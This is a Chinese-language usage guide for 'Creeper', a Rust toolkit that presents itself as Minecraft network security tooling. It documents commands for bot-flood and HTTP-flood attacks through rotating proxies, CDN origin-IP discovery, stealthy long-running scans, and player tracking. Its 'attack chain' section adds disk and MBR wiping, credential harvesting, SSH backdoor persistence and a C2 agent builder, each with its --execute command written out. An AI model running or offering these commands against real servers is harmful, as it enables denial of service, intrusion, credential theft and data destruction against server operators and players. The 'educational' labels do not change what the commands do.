# Creeper 使用指南

Minecraft 网络安全工具箱，支持 MC 协议探测、压力测试、CDN 检测、端口扫描、Hub 分布式监控、攻击链模拟等。

## 目录

- [环境要求](#环境要求)
- [编译](#编译)
- [命令速查](#命令速查)
- [配置文件](#配置文件)
- [系统服务](#系统服务)
- [代理使用](#代理使用)
- [常见问题](#常见问题)

---

## 环境要求

- **Rust** 1.75+
- **操作系统**：Linux / macOS / Windows
- **网络**：能连接到目标服务器

### 安装 Rust

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source "$HOME/.cargo/env"
```

---

## 编译

```bash
git clone <项目地址>
cd rust-creeper

cargo build --release
# 产物在 target/release/creeper
```

验证编译：

```bash
./target/release/creeper --help
./target/release/creeper --version
```

---

## 命令速查

所有命令按功能分组。

### 🕵️ 侦查 — Recon / OSINT

| 命令 | 别名 | 说明 |
|------|------|------|
| `mc-info` | `mci` | 单次查询 MC 服务器 MOTD、在线玩家、版本、延迟 |
| `cdn-check` | `ck` | 检测域名是否在 CDN（Cloudflare 等）后面，获取真实 IP |
| `mc-journal` | `mcj` | 查看玩家日志名册（本地或从 Hub 拉取） |
| `mc-annotate` | `mca` | 给玩家打标签（角色/备注） |
| `host-info` | `hi` | 查询本机系统信息（OS / admin / 可用 shell） |

```bash
creeper mc-info mc.example.com
creeper mc-info mc.example.com -p 25565

creeper cdn-check example.com

creeper mc-journal                          # 查看本地日志
creeper mc-journal --hub http://hub:9090    # 从 Hub 拉取

creeper mc-annotate mc.example.com Player123 --role 管理员 --note "服主"
```

### 👁️ 监控 — Monitor

| 命令 | 别名 | 说明 |
|------|------|------|
| `mc-monitor` | `mcm` | 循环探测 MC 服务器在线状态 + 玩家名册，可 sync 到 Hub |
| `tui` | `t` | 终端仪表盘，实时显示服务器状态、玩家日志、Flood 统计 |
| `host-monitor` | `hm` | 循环探测本机资源（CPU/RAM/磁盘/负载），POST 到 Hub |
| `backup` | `b` | 数据备份打包 .zip（本地或从 Hub 远程拉取） |

```bash
# 单目标监控，每 30 秒扫描一次
creeper mc-monitor mc.example.com -t 30

# 多目标监控（从 JSON 文件读取目标列表）
creeper mc-monitor --targets data/targets-template.json

# 带 Hub 同步
creeper mc-monitor mc.example.com --hub http://my-hub:9090

# TUI 仪表盘
creeper tui mc.example.com

# 本机资源监控（探针角色）
creeper host-monitor --hub http://my-hub:9090 -i 60

# 备份
creeper backup                              # 本地备份
creeper backup --remote http://hub:9090     # 从 Hub 远程拉取备份
```

### 💥 压力测试 — Stress-Test

| 命令 | 别名 | 说明 |
|------|------|------|
| `mc-stress` | `mcs` | MC 机器人洪水攻击：批量登录假玩家，支持代理、自动注册 |
| `http-flood` | `hf` | HTTP/HTTPS 洪水攻击：高并发请求，支持所有方法和代理 |

```bash
# MC 压力测试
creeper mc-stress -h mc.example.com -c 100 -d 500
creeper mc-stress -h mc.example.com -c 50 -P proxies.txt -N nicks.txt -r

# HTTP 洪水攻击
creeper http-flood https://example.com -c 200 -n 10000
creeper http-flood https://example.com -c 100 -X POST -b '{"key":"val"}' -H "Authorization: Bearer xxx"
```

#### mc-stress 参数

| 参数 | 缩写 | 默认值 | 说明 |
|------|------|--------|------|
| `--host` | `-h` | `127.0.0.1` | 服务器地址 |
| `--port` | `-p` | `25565` | 服务器端口 |
| `--count` | `-c` | `20` | 机器人数量 |
| `--delay` | `-d` | `1000` | 每个机器人加入间隔（毫秒） |
| `--name` | `-n` | `Bot-%d` | 机器人名字格式（`%d` 替换为序号） |
| `--version` | `-v` | `1.21.1` | Minecraft 版本 |
| `--register` | `-r` | — | 加入后自动执行 /register 和 /login |
| `--proxies` | `-P` | — | 代理列表文件路径 |
| `--nicks` | `-N` | — | 昵称列表文件路径 |

#### http-flood 参数

| 参数 | 缩写 | 默认值 | 说明 |
|------|------|--------|------|
| `--method` | `-X` | `GET` | HTTP 方法（GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS） |
| `--concurrency` | `-c` | `50` | 并发连接数 |
| `--total` | `-n` | `0` | 总请求数（0 = 不限，按 Ctrl+C 停止） |
| `--body` | `-b` | — | 请求体（POST/PUT/PATCH 时使用） |
| `--delay` | `-d` | `0` | 请求间隔（毫秒） |
| `--header` | `-H` | — | 自定义请求头，可重复（`-H "Key: Value"`） |
| `--proxy` | `-P` | — | 代理 URL，可重复 |
| `--timeout` | `-t` | `30` | 请求超时（秒） |

### 🔍 发现与扫描 — Discovery & Scan

| 命令 | 别名 | 说明 |
|------|------|------|
| `mc-discover` | `mcd` | 域名模式 + 端口段扫描，发现 MC 服务器 |
| `mc-crawl` | `mcc` | 慢速长跑扫描（低并发，适合长期潜伏探索） |
| `port-scan` | `ps` | IPv4 范围 + 端口扫描，带协议检测（nmap 式） |

```bash
# 域名模式扫描
creeper mc-discover --domains "srv{}.example.com:1..50" --ports "25565,10000-10500"

# 慢速爬取
creeper mc-crawl --targets data/targets-template.json -c 5 --round-delay 300

# 端口扫描
creeper port-scan -T 192.168.1.0/24 -p "22,80,443,3389" -m tcp,http
creeper port-scan -T 10.0.0.1~10.0.0.254 -p "1-1024" -c 200
```

### 🌐 Hub 分布式系统

| 命令 | 别名 | 说明 |
|------|------|------|
| `hub-serve` | `hs` | 启动 Hub 服务端，接收其他节点 sync |
| `hub-query` | `hq` | 查询 Hub 节点状态、玩家名册、服务器列表 |
| `hub-submit` | `hsub` | 提交扫描任务到 Hub，分发给 worker |
| `hub-worker` | `hw` | Worker 模式：从 Hub poll 任务并执行 |
| `hub-tasks` | `ht` | 列出 Hub 上的所有任务 |

```bash
# 启动 Hub 服务端
creeper hub-serve --host 0.0.0.0 --port 9090

# 查询 Hub 状态
creeper hub-query http://localhost:9090
creeper hub-query http://localhost:9090 --scope players   # 完整玩家名册
creeper hub-query http://localhost:9090 --scope servers   # 服务器概览
creeper hub-query http://localhost:9090 --scope hosts     # 探针资源聚合
creeper hub-query --scope all                             # 全部信息

# 提交任务
creeper hub-submit --hub http://my-hub:9090 example.com other.com --ports "25565,10000-10500"

# 启动 Worker
creeper hub-worker --hub http://my-hub:9090 --worker-id worker-1 --poll-interval 60

# 查看任务列表
creeper hub-tasks --hub http://my-hub:9090
```

### 🧨 攻击链模块（教育用途）

| 命令 | 别名 | 说明 |
|------|------|------|
| `wipe` | `w` | 自毁/抹盘 — 默认 dry-run，需 `--execute` 确认 |
| `harvest` | `h` | 敏感文件/凭据回收 — 只读收集，无破坏性 |
| `persist` | `p` | 持久化后门投放 — 默认 dry-run，需 `--execute` 确认 |
| `hids-check` | `hids` | 主机入侵指标自检 — 只读安全检查 |

```bash
# 查看抹盘计划（dry-run）
creeper wipe --platform linux --level mbr

# 实际执行 Windows 完整抹盘（静默模式）
creeper wipe --platform windows --level full --execute -y

# 收集 Linux 凭据
creeper harvest --platform linux
creeper harvest --platform linux --output ./report --zip

# 查看持久化计划（dry-run）
creeper persist --ssh-key "ssh-rsa AAAA..."

# 实际部署 SSH 后门
creeper persist --ssh-key "ssh-rsa AAAA..." --execute

# HIDS 自检
creeper hids-check
creeper hids-check --json        # JSON 格式输出
```

### 🛠 辅助工具

| 命令 | 别名 | 说明 |
|------|------|------|
| `config` | `c` | 配置管理（查看/编辑/打印默认值） |
| `service` | `sv` | 系统服务管理（install/start/stop/status/uninstall） |
| `c2-build` | `cb` | 构建 C2 agent 二进制（教育用途） |

```bash
# 配置管理
creeper config --default          # 打印默认配置
creeper config --show             # 查看当前配置
creeper config --edit             # 编辑配置文件

# 服务管理
creeper service install
creeper service start
creeper service status
creeper service stop
creeper service uninstall

# 构建 C2 agent
creeper c2-build -S http://c2-server:8080
```

---

## 配置文件

配置文件位于 `$XDG_CONFIG_HOME/creeper/config.json`（Linux: `~/.config/creeper/`，macOS: `~/Library/Application Support/creeper/`）。

```bash
creeper config --default    # 生成默认配置模板
creeper config --show       # 查看当前配置
creeper config --edit       # 编辑配置文件
```

完整配置项说明见 [`config/schema.json`](../config/schema.json)。

### CLI 参数优先级

CLI 参数 > 配置文件 > 默认值。

---

## 系统服务

支持安装为系统服务，开机自启。

| 平台 | 后端 |
|------|------|
| Linux | systemd |
| macOS | launchd |
| Windows | Windows Service (SCM) |

```bash
creeper service install     # 安装服务
creeper service start       # 启动
creeper service status      # 查看状态
creeper service stop        # 停止
creeper service uninstall   # 卸载
```

---

## 代理使用

支持三种代理协议：

| 格式 | 协议 | 示例 |
|------|------|------|
| `socks5://host:port` | SOCKS5 | `socks5://127.0.0.1:1080` |
| `socks5://user:pass@host:port` | SOCKS5 带认证 | `socks5://user:pass@127.0.0.1:1080` |
| `socks4://host:port` | SOCKS4 | `socks4://10.0.0.1:4145` |
| `http://host:port` | HTTP CONNECT | `http://proxy.example.com:8080` |
| `host:port` | 自动补为 SOCKS5 | `127.0.0.1:1080`（兼容旧格式） |

### 代理文件格式

每行一个代理，空行和 `#` 开头的行会被忽略：

```
socks5://127.0.0.1:1080
socks4://10.0.0.1:4145
http://user:password@proxy.example.com:8080
# 以下会被自动补为 socks5://
192.168.1.1:9050
10.0.0.2:1080
```

### 昵称文件格式

每行一个昵称：

```
Steve
Alex
Player123
BuildMaster
```

---

## 常见问题

**Q: 编译失败怎么办？**

确保 Rust 版本 >= 1.75：

```bash
rustup update stable
```

**Q: 提示 "Unsupported version: 1.xx"**

当前支持的版本范围见 `src/protocol/mod.rs`。用 `-v 1.21.1` 试试。

**Q: 代理用不了？**

确保代理 URL 格式正确：`socks5://host:port`。`proxy.verify` 默认开启，会验证代理是否可用。

**Q: 怎么退出程序？**

按 `Ctrl+C`。

**Q: 服务装好了怎么改配置？**

编辑配置文件后重启服务：

```bash
creeper service stop
creeper service start
```